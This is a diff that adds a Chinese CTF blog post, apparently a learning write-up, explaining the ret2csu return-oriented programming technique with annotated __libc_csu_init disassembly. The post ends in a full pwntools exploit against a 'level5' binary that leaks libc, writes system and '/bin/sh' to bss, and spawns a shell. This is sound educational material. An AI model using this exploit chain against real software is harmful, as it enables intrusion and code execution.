@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ret2csu原理在64位程序中, 函数调用的前六个参数是通过寄存器传参的(rdi, rsi, rdx, rcx, r8, r9), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:__libc_csu_init, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-ret2csu">
+<meta property="og:url" content="https://blog.mark0519.com/post/pwn-ret2csu.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="ret2csu原理在64位程序中, 函数调用的前六个参数是通过寄存器传参的(rdi, rsi, rdx, rcx, r8, r9), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:__libc_csu_init, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-21T14:29:31.000Z">
+<meta property="article:modified_time" content="2021-11-21T14:17:46.732Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/pwn-ret2csu.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-ret2csu | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/pwn-ret2csu.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-ret2csu
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-21 22:29:31" itemprop="dateCreated datePublished" datetime="2021-02-21T22:29:31+08:00">2021-02-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-21 22:17:46" itemprop="dateModified" datetime="2021-11-21T22:17:46+08:00">2021-11-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在64位程序中, 函数调用的前六个参数是通过寄存器传参的(<code>rdi, rsi, rdx, rcx, r8, r9</code>), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:<code>__libc_csu_init</code>, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程序中都会出现. </p>
+<span id="more"></span>
+
+<p>函数的二进制形式如下:(不同libc版本大致相同)</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:00000000004005A0 ; void _libc_csu_init(void)
+.text:00000000004005A0                 public __libc_csu_init
+.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
+.text:00000000004005A0
+.text:00000000004005A0 var_30          &#x3D; qword ptr -30h
+.text:00000000004005A0 var_28          &#x3D; qword ptr -28h
+.text:00000000004005A0 var_20          &#x3D; qword ptr -20h
+.text:00000000004005A0 var_18          &#x3D; qword ptr -18h
+.text:00000000004005A0 var_10          &#x3D; qword ptr -10h
+.text:00000000004005A0 var_8           &#x3D; qword ptr -8
+.text:00000000004005A0
+.text:00000000004005A0 ; __unwind &#123;
+.text:00000000004005A0                 mov     [rsp+var_28], rbp
+.text:00000000004005A5                 mov     [rsp+var_20], r12
+.text:00000000004005AA                 lea     rbp, cs:600E24h
+.text:00000000004005B1                 lea     r12, cs:600E24h
+.text:00000000004005B8                 mov     [rsp+var_18], r13
+.text:00000000004005BD                 mov     [rsp+var_10], r14
+.text:00000000004005C2                 mov     [rsp+var_8], r15
+.text:00000000004005C7                 mov     [rsp+var_30], rbx
+.text:00000000004005CC                 sub     rsp, 38h
+.text:00000000004005D0                 sub     rbp, r12
+.text:00000000004005D3                 mov     r13d, edi
+.text:00000000004005D6                 mov     r14, rsi
+.text:00000000004005D9                 sar     rbp, 3
+.text:00000000004005DD                 mov     r15, rdx
+.text:00000000004005E0                 call    _init_proc
+.text:00000000004005E5                 test    rbp, rbp
+.text:00000000004005E8                 jz      short loc_400606
+.text:00000000004005EA                 xor     ebx, ebx
+.text:00000000004005EC                 nop     dword ptr [rax+00h]
+.text:00000000004005F0
+.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j
+.text:00000000004005F0                 mov     rdx, r15
+.text:00000000004005F3                 mov     rsi, r14
+.text:00000000004005F6                 mov     edi, r13d
+.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
+.text:00000000004005FD                 add     rbx, 1
+.text:0000000000400601                 cmp     rbx, rbp
+.text:0000000000400604                 jnz     short loc_4005F0
+.text:0000000000400606
+.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
+.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
+.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
+.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
+.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
+.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
+.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
+.text:0000000000400624                 add     rsp, 38h
+.text:0000000000400628                 retn
+.text:0000000000400628 ; &#125; &#x2F;&#x2F; starts at 4005A0
+.text:0000000000400628 __libc_csu_init endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，利用0x4005f0处的代码将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]，这时候将rbx赋值0，可以将想调用的函数地址传给r12。执行完函数之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1。</p>
+<p>rbx 0</p>
+<p>rbp 1</p>
+<p>r12 想调用的函数地址</p>
+<p>r13 -&gt;edi 函数第三个参数 </p>
+<p>r14 -&gt;rsi 函数第二个参数</p>
+<p>r15 -&gt;rdx 函数第一个参数</p>
+<h2 id="利用顺序"><a href="#利用顺序" class="headerlink" title="利用顺序"></a>利用顺序</h2><p>我们主要利用顺序如下:</p>
+<ol>
+<li><code>0x0000000000400606~0000000000400628</code>, (利用栈溢出构造栈上数据)依次修改<code>rbx, rbp, r12, r13, r14, r15</code>六个寄存器的值.(这里需要注意的是rsp是栈顶指针, 可能不是从rsp开始压入rbx, 上面的<code>var_30</code>就是从<code>rsp+8</code>开始压栈的, 所以写payload的时候需要加上一个<code>p64(0)</code>)</li>
+<li>上面修改的寄存器的值是为接下来的<code>0x00000000004005F0~0x0000000000400604</code>这段代码服务的, 我们通过修改<code>rdx, rsi, edi</code>的值来当做下一步<code>call qword ptr [r12+rbx*8]</code>的参数, 这样只要我们把rbx设为0, 把r12的值设为我们想要跳转到函数的got地址即可.</li>
+<li><code>0x000000000040060D~0x0000000000400614</code>, 我们为了不让它循环(往下执行), 而在上面已经把rbx设为0, 因此需要在第1步把rbp的值设为1</li>
+</ol>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> 
+
+write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+
+main_addr<span class="token operator">=</span><span class="token number">0x400564</span>
+
+payload1<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span>
+<span class="token comment">#                            pop_junk  rbx     rbp       r12        r13         r14       r15         ret</span>
+payload1<span class="token operator">+=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x38</span>
+payload1<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+
+
+write_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+system_addr<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span>
+<span class="token comment">#                       pop_junk    rbx      rbp         r12          r13         r14          r15         ret</span>
+payload2<span class="token operator">+=</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
+
+payload3<span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> 
+<span class="token comment">#                          pop_junk    rbx      rbp         r12       r13("/bin/sh\0")   r14     r15         ret</span>
+payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>
+payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>
+
+
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-libc.html" rel="prev" title="pwn-libc">
+      <i class="fa fa-chevron-left"></i> pwn-libc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/pwn-libc-about-exp.html" rel="next" title="pwn-libc_about_exp">
+      pwn-libc_about_exp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-number">1.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.2.</span> <span class="nav-text">利用顺序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
